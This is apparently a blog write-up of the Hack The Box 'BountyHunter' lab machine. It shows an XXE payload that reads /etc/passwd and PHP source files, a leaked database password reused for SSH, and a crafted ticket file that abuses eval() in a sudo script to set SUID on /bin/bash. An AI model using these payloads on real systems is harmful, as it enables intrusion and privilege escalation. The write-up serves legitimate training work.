---
title: Bounty Hunter Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---


## Enumeration

```ruby
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 3072 41 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|_ 256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_ 256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User Exploit

Investigating the page, we find the section `/log_submit.php`, which if we intercept the data sent with Burpsuite we see that they are sent in XML format but encoded in base 64
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test0</title>
		<cwe>test1</cwe>
		<cvss>test2</cvss>
		<reward>test2</reward>
		</bugreport>
```

So we can inject an XXE to view the /etc/passwd in Base64 format and then URL-Encoded:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>test1</cwe>
		<cvss>test2</cvss>
		<reward>test2</reward>
		</bugreport>
```

We tried to list `.ssh/id_rsa` but we can't either. 

Investigating a bit more through the web page, we find `log_submit.php`. However, since we are dealing with Php, we are going to use a different wrapper:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=log_submit.php"> ]>
```

This will report it to us in base64, so let's decode it using `base64 -d `.  Unfortunately, this doesn't give us much information either... 

Let's apply a wfuzz to see if we find any more .php files:

```shell
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php http://10.129.166.240/FUZZ.FUZ2Z/
```

But neither.

However, applying `dirsearch` we see a file called `db.php`, which we are going to try to read its content through the php wrapper in the XML code:
We decode it and see that we report the following information:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test."
?>
```

we use the user `development` extracted from /etc/passwd along with the password `m19RoAU0hP41A1sTsq6K` to connect via SSH and succeed.
## Root Exploit

Doing sudo -l we can run the following python script as root using python 3.8:

`/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py`.

So let's look into it.

```python
#Skytrain Inc Ticket Validation System 0.1
#`Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f "Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

As you can see, the script has an `eval()` function which we have to get to, since we can inject malicious command in it.

Therefore, let's create a file that ends in .md by injecting the following code into it:
```python
## Skytrain Inc --> 1st if
## Ticket to --> 2nd if
Ticket Code:__Ticket Code:__ # --> 3rd If
** 11+2 and __import__('os').system('chmod u+s /bin/bash') # --> 4th if where we insert the malicious code 
```

if everything works fine, doing `/bin/bash -p` will make us root and we will be able to send the root.txt flag.
